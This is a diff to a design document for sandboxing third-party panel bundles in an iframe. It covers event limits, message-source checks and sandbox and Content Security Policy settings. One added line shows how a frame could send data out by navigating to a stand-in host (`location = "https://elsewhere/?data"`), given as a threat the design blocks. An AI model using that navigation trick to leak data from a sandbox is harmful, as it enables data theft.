@@ -380,6 +380,9 @@ Results keep the query's limits; a panel cannot run queries of its own.
 
 Rules:
 
+- Enforcement lies with the panel host, which is not built yet: it runs `parse_event` on every
+  event and keeps the rate limit per panel. Until it exists, nothing receives panel events; the
+  rules below are what the host will hold a bundle to.
 - An event is at most 16 KiB of JSON; Kalzit takes at most 20 events per second per panel and
   drops the rest. An event of another `api`, an unknown `type` or a field out of its range is
   dropped (`panel.not_json`, `panel.not_envelope`, `panel.api_unsupported`, `panel.type_unknown`,
@@ -389,6 +392,15 @@ Rules:
   like the same gestures on built-in panels.
 - Both sides accept messages only from the other window (`event.source`): the frame's origin is
   opaque (`null`), so origins say nothing.
+- For the host's design: `connect-src 'none'` stops requests, but a frame can still carry data
+  out by navigating, itself (`location = "https://elsewhere/?data"`), a new window or the top
+  page. The host therefore loads the bundle with `sandbox="allow-scripts"` only (no
+  `allow-top-navigation`, `allow-popups` or `allow-forms`), serves the frame document and the
+  bundle with a strict Content Security Policy of their own (`default-src 'none'`, the bundle as
+  the only script, no `form-action`, `base-uri 'none'`), and blocks the frame's own navigation
+  away from the bundle's document (CSP `navigate-to` where browsers support it; otherwise the
+  host treats a navigation of the frame, seen as a new `load` event, as a breach and removes the
+  panel).
 - Evolution: version 1 grows only by new optional fields and new message types. A panel ignores
   types and fields it does not know; Kalzit speaks to a bundle in the version its manifest names
   (`[panel] api`) and refuses versions it does not know at install.
